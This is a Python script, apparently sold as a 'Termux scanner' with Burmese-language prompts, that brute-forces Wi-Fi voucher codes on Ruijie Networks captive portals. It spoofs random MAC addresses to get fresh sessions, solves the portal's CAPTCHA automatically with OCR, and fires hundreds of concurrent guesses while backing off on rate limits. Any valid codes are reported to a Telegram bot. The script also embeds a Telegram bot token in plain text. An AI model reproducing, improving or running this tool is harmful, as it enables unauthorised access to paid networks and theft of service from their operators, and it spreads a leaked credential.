import asyncio, aiohttp, json, random, re, os, string, time, cv2, ddddocr, numpy as np
from datetime import datetime, timezone
import telebot
from telebot.async_telebot import AsyncTeleBot

try: import uvloop; asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
except: pass

BOT_TOKEN = '8878643302:AAHTVx84Y6UT3IBqSQsZNXfH8OWyY6vHEAE'
REPO_OWNER = "abkay400-sys"
REPO_NAME = "mgmgsan-"

bot = AsyncTeleBot(BOT_TOKEN)
_ocr = ddddocr.DdddOcr(show_ad=False)
checked_count = 0
CONCURRENCY, BATCH_SIZE = 500, 500

async def check_user_key(chat_id):
    url = f"https://raw.githubusercontent.com/{REPO_OWNER}/{REPO_NAME}/main/auth_list.json"
    async with aiohttp.ClientSession() as s:
        async with s.get(url) as r:
            if r.status == 200:
                auth_list = json.loads(await r.text())
                if chat_id in auth_list:
                    expiry = auth_list[chat_id].get("expires_at")
                    if expiry == "9999-12-31T23:59:59Z": return True
                    return datetime.now(timezone.utc) < datetime.fromisoformat(expiry.replace("Z", "+00:00"))
    return False

async def get_session_id(session, url):
    mac = ':'.join(f'{random.randint(0x00, 0xff):02x}' for _ in range(6))
    url = re.sub(r'(?<=mac=)[^&]+', mac, url)
    try:
        async with session.get(url, allow_redirects=True) as req:
            s_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
            return s_id.group(1) if s_id else None
    except: return None

async def perform_check(session_url, code, chat_id):
    global checked_count
    await asyncio.sleep(random.uniform(0.2, 0.7))
    async with aiohttp.ClientSession() as ts:
        session_id = await get_session_id(ts, session_url)
        if not session_id: return
        auth_code = None
        for _ in range(5):
            try:
                params = {'sessionId': session_id, '_t': str(time.time())}
                async with ts.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params) as r: img = await r.read()
                txt = await asyncio.to_thread(lambda: _ocr.classification(img).upper())
                if txt:
                    async with ts.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', json={'sessionId': session_id, 'authCode': txt}) as vr:
                        if (await vr.json()).get("success") == True: auth_code = txt; break
            except: pass
        if not auth_code: return
        try:
            async with ts.post('https://portal-as.ruijienetworks.com/api/auth/voucher/', json={"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": auth_code}) as req:
                if req.status == 429: await asyncio.sleep(5); return
                resp = await req.text()
                checked_count += 1
                if 'success' in resp.lower() or '"code":0' in resp:
                    print(f"\n🎉 [FOUND] {code}")
                    await bot.send_message(chat_id, f"🎉 **Voucher Code Found!**\n🎫 Code: `{code}`", parse_mode="Markdown")
        except: pass

def iter_codes(mode):
    if mode in ["6", "7"]:
        c = [str(i).zfill(int(mode)) for i in range(10**int(mode))]; random.shuffle(c); yield from c
    else:
        while True: yield "".join(random.choices(string.ascii_lowercase + string.digits, k=6))

async def main_terminal():
    os.system('clear')
    print("\033[1;36m===================================================\n      🔥 MGSAN OFFICIAL TERMUX SCANNER 🔥\n===================================================\033[0m")
    chat_id_input = input("👤 သင့်၏ Telegram ID ကို ရိုက်ထည့်ပါ: ").strip()
    
    print("⏳ Key သက်တမ်း စစ်ဆေးနေပါသည်...")
    if not await check_user_key(chat_id_input):
        print("❌ သင့် Key သည် သက်တမ်းကုန်ဆုံးနေပါပြီ သို့မဟုတ် Key မရှိပါ။"); return
    
    print("✅ Key အောင်မြင်ပါသည်။")
    session_url = input("\n🔗 သင့်၏ Ruijie Session URL ကို Paste ချပေးပါ: ").strip()
    if not session_url: print("❌ URL မမှန်ကန်ပါ။"); return
    mode = input("📊 Scan Mode ရွေးပါ (6, 7, 8, all): ").strip()
    print(f"\n🚀 Scanning စတင်နေပါပြီ...\n")
    
    code_iter = iter_codes(mode)
    while True:
        batch = [next(code_iter) for _ in range(BATCH_SIZE)]
        await asyncio.gather(*[perform_check(session_url, c, int(chat_id_input)) for c in batch])
        print(f"\r⚡ Checked: {checked_count:,} codes...", end="")
        await asyncio.sleep(0.5)

if __name__ == '__main__':
    asyncio.run(main_terminal())
              
